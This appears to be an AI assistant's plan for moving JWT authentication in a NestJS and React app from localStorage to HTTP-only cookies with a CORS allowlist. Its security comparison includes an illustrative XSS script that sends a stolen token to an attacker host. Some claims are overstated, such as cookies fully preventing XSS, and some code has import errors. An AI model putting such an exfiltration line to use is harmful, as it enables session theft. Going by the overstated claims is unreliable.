# Cookie-Based Authentication Implementation Plan

## Your Question
> "In login time, I don't want to store tokens in localStorage on frontend. Instead, use cookies. And only in my frontend URL, access to this server. First tell me the implementation plan."

---

## Quick Answer (30 seconds)

**Current System** (JWT in Response Body):
```
Frontend calls: POST /auth/login
Backend returns: { accessToken: "abc123", refreshToken: "xyz789" }
Frontend stores: localStorage.setItem('token', 'abc123')
Problem: JavaScript can access localStorage (XSS vulnerability)
```

**New System** (JWT in HTTP-Only Cookies):
```
Frontend calls: POST /auth/login
Backend returns: Cookies in response headers (automatic)
Frontend stores: Browser auto-stores cookies
Benefit: JavaScript cannot access HTTP-Only cookies (XSS protection)
Only your frontend URL: CORS whitelist prevents other sites from accessing
```

---

## Implementation Plan (Step-by-Step)

### Phase 1: Backend Changes (This Server)

#### Step 1: Set Cookies in Login Response
**File**: `src/auth/auth.service.ts`

**Change**: Instead of returning tokens in JSON body, set them as HTTP-Only cookies

```typescript
// BEFORE (Current)
return {
  accessToken: tokens.accessToken,
  refreshToken: tokens.refreshToken,
  expiresIn: ...,
  user: { ... }
};

// AFTER (New)
res.cookie('accessToken', tokens.accessToken, {
  httpOnly: true,      // JavaScript cannot access
  secure: true,        // HTTPS only
  sameSite: 'strict',  // CSRF protection
  maxAge: 15 * 60 * 1000  // 15 minutes
});

res.cookie('refreshToken', tokens.refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
});

return {
  success: true,
  message: 'Login successful',
  user: { ... }
  // tokens NOT in body anymore (they're in cookies)
};
```

#### Step 2: Configure CORS for Cookie Credentials
**File**: `src/main.ts`

**Change**: Allow credentials (cookies) from your frontend URL

```typescript
app.enableCors({
  origin: process.env.FRONTEND_URL || 'http://localhost:3000',
  credentials: true,  // ← IMPORTANT: Allow cookies
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
});
```

#### Step 3: Update JWT Guard to Read Cookies
**File**: `src/common/guards/jwt.guard.ts`

**Change**: Extract token from cookies instead of Authorization header

```typescript
// BEFORE (Current)
const token = request.headers.authorization?.split(' ')[1];

// AFTER (New)
const token = request.cookies.accessToken;
```

#### Step 4: Store Refresh Tokens in Database (Already Done ✅)
**File**: `src/auth/auth.entity.ts`

**Status**: ✅ Already implemented! Refresh tokens stored in database.
This is good because:
- Tokens can be revoked
- Can track token usage
- Security audit trail

### Phase 2: Frontend Changes (Your React App)

#### Step 1: Update Login API Call
```javascript
// BEFORE (Current)
const response = await fetch('http://backend.com/auth/login', {
  method: 'POST',
  body: JSON.stringify(credentials)
});
const data = await response.json();
localStorage.setItem('token', data.accessToken); // ❌ XSS risk

// AFTER (New)
const response = await fetch('http://backend.com/auth/login', {
  method: 'POST',
  body: JSON.stringify(credentials),
  credentials: 'include'  // ← IMPORTANT: Send/receive cookies
});
const data = await response.json();
// Cookies auto-stored by browser, no localStorage needed ✅
```

#### Step 2: Update API Requests (Add Credentials)
```javascript
// BEFORE (Current)
fetch('http://backend.com/users/me', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('token')}`
  }
});

// AFTER (New)
fetch('http://backend.com/users/me', {
  credentials: 'include'  // ← Send cookies automatically
  // No Authorization header needed
});
```

#### Step 3: Update Logout
```javascript
// BEFORE (Current)
localStorage.removeItem('token');

// AFTER (New)
await fetch('http://backend.com/auth/logout', {
  method: 'POST',
  credentials: 'include'  // Browser sends cookies
});
// Cookies auto-cleared by server ✅
```

---

## Architecture Diagram

### Current System (JWT in Response Body)
```
┌─────────────┐                    ┌──────────────┐
│   Frontend  │                    │   Backend    │
│   (React)   │                    │   (NestJS)   │
└──────┬──────┘                    └──────┬───────┘
       │                                  │
       │ POST /auth/login                │
       │ {email, password}               │
       ├─────────────────────────────────>│
       │                                  │
       │                        1. Find user
       │                        2. Verify password
       │                        3. Generate tokens
       │                                  │
       │ {accessToken, refreshToken}     │
       │<─────────────────────────────────┤
       │                                  │
       │ Store in localStorage ❌ XSS Risk│
       │ (JavaScript can access)          │
       │                                  │
       │ GET /users/me                   │
       │ Authorization: Bearer abc123    │
       ├─────────────────────────────────>│
       │                                  │
       │                        Verify token
       │ {user data}                      │
       │<─────────────────────────────────┤
```

### New System (JWT in HTTP-Only Cookies)
```
┌─────────────┐                    ┌──────────────┐
│   Frontend  │                    │   Backend    │
│   (React)   │                    │   NestJS)    │
└──────┬──────┘                    └──────┬───────┘
       │                                  │
       │ POST /auth/login                │
       │ {email, password}               │
       │ credentials: 'include'          │
       ├─────────────────────────────────>│
       │                                  │
       │                        1. Find user
       │                        2. Verify password
       │                        3. Generate tokens
       │                        4. Set cookies:
       │                           - accessToken (15m)
       │                           - refreshToken (7d)
       │                                  │
       │ Response: Set-Cookie header ✅  │
       │ (Browser auto-manages)           │
       │<─────────────────────────────────┤
       │                                  │
       │ Cookies stored in browser       │
       │ (JavaScript CANNOT access) ✅   │
       │                                  │
       │ GET /users/me                   │
       │ credentials: 'include'          │
       │ (Cookies sent automatically)    │
       ├─────────────────────────────────>│
       │                                  │
       │                        Read cookies
       │                        Verify token
       │ {user data}                      │
       │<─────────────────────────────────┤
```

---

## Security Comparison

### Before (Tokens in Response Body)
```
Vulnerability: XSS (Cross-Site Scripting)
│
├─ Attacker injects malicious script
│  <script>
│    const token = localStorage.getItem('token');
│    fetch('http://attacker.com?token=' + token);
│  </script>
│
├─ Attacker steals token from localStorage
├─ Attacker can impersonate user
└─ Account compromise
```

### After (Tokens in HTTP-Only Cookies)
```
Protection: XSS Resistance
│
├─ Attacker injects malicious script
│  <script>
│    const token = document.cookie; // ❌ HTTP-Only, cannot access
│  </script>
│
├─ HTTP-Only cookies not accessible to JavaScript
├─ Attacker cannot steal token
├─ Account remains safe
└─ ✅ XSS attack prevented
```

---

## Detailed Implementation Steps

### Backend Implementation

#### Step 1: Update auth.controller.ts
Add Response object to login and register endpoints:

```typescript
import { Response } from '@nestjs/common';

@Controller('auth')
export class AuthController {
  @Post('login')
  @Public()
  @HttpCode(200)
  async login(
    @Body() loginDto: LoginDto,
    @Res() res: Response  // ← Add this
  ) {
    const result = await this.authService.login(loginDto);

    // Set cookies
    res.cookie('accessToken', result.accessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000,
    });

    res.cookie('refreshToken', result.refreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });

    // Return response without tokens
    return res.json({
      success: true,
      message: 'Login successful',
      user: result.user,
    });
  }

  @Post('register')
  @Public()
  @HttpCode(201)
  async register(
    @Body() registerDto: RegisterDto,
    @Res() res: Response  // ← Add this
  ) {
    const result = await this.authService.register(registerDto);

    // Set cookies
    res.cookie('accessToken', result.accessToken, {...});
    res.cookie('refreshToken', result.refreshToken, {...});

    return res.json({
      success: true,
      message: 'Registration successful',
      user: result.user,
    });
  }

  @Post('logout')
  @UseGuards(JwtGuard)
  @HttpCode(200)
  async logout(@Request() req: any, @Res() res: Response) {
    const userId = req.user.sub;
    await this.authService.logout(userId, req.cookies.refreshToken);

    // Clear cookies
    res.clearCookie('accessToken');
    res.clearCookie('refreshToken');

    return res.json({
      success: true,
      message: 'Logged out successfully',
    });
  }
}
```

#### Step 2: Update jwt.guard.ts
Extract token from cookies:

```typescript
import { Injectable } from '@nestjs/common';
import { AuthGuard } from '@nestjs/passport';

@Injectable()
export class JwtGuard extends AuthGuard('jwt') {
  canActivate(context: ExecutionContext) {
    const request = context.switchToHttp().getRequest();

    // Get token from cookies instead of Authorization header
    const token = request.cookies.accessToken;

    if (!token) {
      throw new UnauthorizedException('No token provided');
    }

    // Set Authorization header for JWT strategy
    request.headers.authorization = `Bearer ${token}`;

    return super.canActivate(context);
  }
}
```

#### Step 3: Update main.ts
Add cookie parser and CORS configuration:

```typescript
import cookieParser from 'cookie-parser';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // ... other middleware ...

  // Cookie Parser (BEFORE CORS)
  app.use(cookieParser());

  // CORS with credentials
  app.enableCors({
    origin: process.env.FRONTEND_URL || 'http://localhost:3000',
    credentials: true,  // ← Allow cookies
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
  });

  // ... rest of middleware ...
}
```

#### Step 4: Update .env
```env
# Add your frontend URL
FRONTEND_URL=http://localhost:3001
# Or for production
FRONTEND_URL=https://myapp.com
```

---

## Frontend Implementation

### React Example with Fetch API

```javascript
// api.js - Configure API client
const API_BASE = 'http://localhost:3000';

export const apiClient = {
  async login(email, password) {
    const response = await fetch(`${API_BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',  // ← Send cookies
      body: JSON.stringify({ email, password })
    });
    return response.json();
  },

  async getMe() {
    const response = await fetch(`${API_BASE}/users/me`, {
      method: 'GET',
      credentials: 'include'  // ← Send cookies automatically
    });
    return response.json();
  },

  async logout() {
    const response = await fetch(`${API_BASE}/auth/logout`, {
      method: 'POST',
      credentials: 'include'  // ← Send cookies
    });
    return response.json();
  }
};

// Login.jsx
import { apiClient } from './api';

export default function Login() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      const data = await apiClient.login(email, password);
      // Cookies already set by browser
      // No localStorage needed!
      console.log('Login successful:', data.user);
      // Redirect to dashboard
    } catch (error) {
      console.error('Login failed:', error);
    }
  };

  return (
    <form onSubmit={handleLogin}>
      <input value={email} onChange={e => setEmail(e.target.value)} />
      <input value={password} onChange={e => setPassword(e.target.value)} />
      <button type="submit">Login</button>
    </form>
  );
}

// Dashboard.jsx - Using protected route
import { useEffect, useState } from 'react';
import { apiClient } from './api';

export default function Dashboard() {
  const [user, setUser] = useState(null);

  useEffect(() => {
    apiClient.getMe().then(data => {
      setUser(data.user);
    });
  }, []);

  if (!user) return <div>Loading...</div>;

  return <div>Welcome {user.name}!</div>;
}
```

### React with Axios

```javascript
import axios from 'axios';

const api = axios.create({
  baseURL: 'http://localhost:3000',
  withCredentials: true  // ← Enable cookies
});

export default api;

// Usage
api.post('/auth/login', { email, password })
  .then(res => console.log('Login:', res.data))
  .catch(err => console.error('Error:', err));

api.get('/users/me')
  .then(res => console.log('User:', res.data))
  .catch(err => console.error('Error:', err));
```

---

## Cookie Configuration Explained

### Cookies Set in Response

**Access Token Cookie**:
```
Set-Cookie: accessToken=eyJhbGc...;
  HttpOnly;           // JS cannot access
  Secure;             // HTTPS only (production)
  SameSite=Strict;    // CSRF protection
  Max-Age=900;        // 15 minutes
  Path=/;             // Available on all paths
  Domain=.example.com // Your domain
```

**Refresh Token Cookie**:
```
Set-Cookie: refreshToken=eyJhbGc...;
  HttpOnly;
  Secure;
  SameSite=Strict;
  Max-Age=604800;     // 7 days
  Path=/;
  Domain=.example.com
```

### Cookie Attributes Explained

| Attribute | Value | Purpose |
|-----------|-------|---------|
| HttpOnly | true | JavaScript cannot access (XSS protection) |
| Secure | true | HTTPS only (prevents man-in-the-middle) |
| SameSite | Strict | Only send with same-origin requests (CSRF protection) |
| Max-Age | seconds | Expiration time |
| Path | / | Available on all routes |
| Domain | .example.com | Available on all subdomains |

---

## "Only Your Frontend URL" - CORS Whitelist

### Current CORS (All Origins)
```typescript
app.enableCors();  // ❌ Allows ALL origins
```

**Problem**: Anyone can call your API
```
Other website: https://evil.com → Your API → Steals cookies
```

### New CORS (Only Your Frontend)
```typescript
app.enableCors({
  origin: 'https://myapp.com',  // ✅ Only this domain
  credentials: true,             // Allow cookies
});
```

**Protection**: Only your frontend can call API
```
Your website:    https://myapp.com  → Your API → ✅ Works
Evil website:    https://evil.com   → Your API → ❌ Blocked
```

### Multiple Domains (Optional)
```typescript
app.enableCors({
  origin: [
    'https://myapp.com',
    'https://app.myapp.com',
    'http://localhost:3001'  // Development
  ],
  credentials: true,
});
```

---

## Step-by-Step Implementation Checklist

### Backend Changes
- [ ] Step 1: Update `src/auth/auth.controller.ts` (Set cookies in response)
- [ ] Step 2: Update `src/common/guards/jwt.guard.ts` (Read from cookies)
- [ ] Step 3: Update `src/main.ts` (CORS + cookie-parser)
- [ ] Step 4: Update `.env` (Add FRONTEND_URL)
- [ ] Step 5: Test login endpoint with curl
- [ ] Step 6: Verify cookies are set

### Frontend Changes
- [ ] Step 1: Update login API call (add `credentials: 'include'`)
- [ ] Step 2: Update all API calls (add `credentials: 'include'`)
- [ ] Step 3: Remove localStorage usage (no token storage)
- [ ] Step 4: Update logout (clear cookies on server side)
- [ ] Step 5: Test login flow
- [ ] Step 6: Verify cookies stored in browser

### Testing
- [ ] Test login with incorrect credentials
- [ ] Test login with correct credentials
- [ ] Verify cookies in browser DevTools
- [ ] Test accessing protected routes
- [ ] Test logout (cookies cleared)
- [ ] Test token refresh
- [ ] Test accessing from different domain (should be blocked)

---

## Security Comparison Table

| Feature | Before (Body) | After (Cookies) |
|---------|---------------|-----------------|
| Storage | localStorage | HTTP cookies |
| XSS Protection | ❌ No (JS can access) | ✅ Yes (HTTP-Only) |
| CSRF Protection | Requires manual check | ✅ Built-in (SameSite) |
| Automatic in Requests | ❌ Manual header | ✅ Automatic |
| Accessible to JavaScript | ✅ Yes (vulnerability) | ❌ No (secure) |
| Cross-domain requests | Easier (CORS) | Controlled (SameSite) |
| Mobile app compatible | ✅ Yes | ✅ Yes (with credentials) |
| Production ready | ❌ Less secure | ✅ More secure |

---

## Troubleshooting

### Issue 1: Cookies Not Being Set
**Problem**: Cookies appear in Set-Cookie header but not stored

**Solution**: Check CORS credentials
```typescript
app.enableCors({
  origin: 'http://localhost:3001',
  credentials: true  // ← Must be true
});
```

**Frontend**:
```javascript
fetch(url, {
  credentials: 'include'  // ← Must be 'include'
});
```

### Issue 2: Cookies Not Sent with Requests
**Problem**: Backend receives cookies but they're empty

**Solution**: Ensure `credentials: 'include'` in all requests
```javascript
// ❌ Wrong
fetch(`${API}/users/me`);

// ✅ Correct
fetch(`${API}/users/me`, {
  credentials: 'include'
});
```

### Issue 3: CORS Error with Credentials
**Problem**: "Credentials mode is 'include' but CORS headers not present"

**Solution**: Configure CORS properly
```typescript
// ❌ Wrong
app.enableCors({
  origin: '*'  // Cannot use * with credentials
});

// ✅ Correct
app.enableCors({
  origin: 'https://myapp.com',
  credentials: true
});
```

### Issue 4: Cookies Not Work on Localhost
**Problem**: Cookies not set on http://localhost

**Solution**: Use `Secure: false` for development
```typescript
res.cookie('accessToken', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',  // false for dev
  sameSite: 'lax',  // Use 'lax' for development
});
```

---

## Production Deployment

### Production Configuration
```typescript
// main.ts
app.enableCors({
  origin: process.env.FRONTEND_URL,
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization'],
});

// res.cookie options
res.cookie('accessToken', token, {
  httpOnly: true,
  secure: true,        // ✅ HTTPS only
  sameSite: 'strict',  // ✅ Strict CSRF protection
  maxAge: 15 * 60 * 1000,
  domain: '.example.com'  // Your production domain
});
```

### .env for Production
```env
FRONTEND_URL=https://myapp.example.com
NODE_ENV=production
DB_HOST=prod-db.example.com
# etc.
```

---

## Summary

### What Changes
1. **Response**: Tokens sent as HTTP-Only cookies (not in JSON body)
2. **Frontend**: Cookies auto-stored by browser (not localStorage)
3. **Requests**: Cookies auto-sent with `credentials: 'include'`
4. **CORS**: Whitelisted to only your frontend URL

### Why This is Better
- ✅ XSS protection (JavaScript cannot steal tokens)
- ✅ CSRF protection (SameSite attribute)
- ✅ Automatic token transmission (no manual headers)
- ✅ Only your frontend can access (CORS whitelist)
- ✅ Production-grade security

### Implementation Complexity
- Backend: 3 files modified (30 minutes)
- Frontend: Update API calls (1-2 hours depending on app size)
- Testing: Verify cookies and security (30 minutes)

**Total Time**: 2-3 hours for full implementation

---

## Next: Ready for Detailed Implementation?

Say "yes" and I will:
1. Update auth.controller.ts with cookie logic
2. Update jwt.guard.ts to read from cookies
3. Update main.ts with proper CORS
4. Create example frontend code
5. Provide testing scripts
6. Verify build compiles
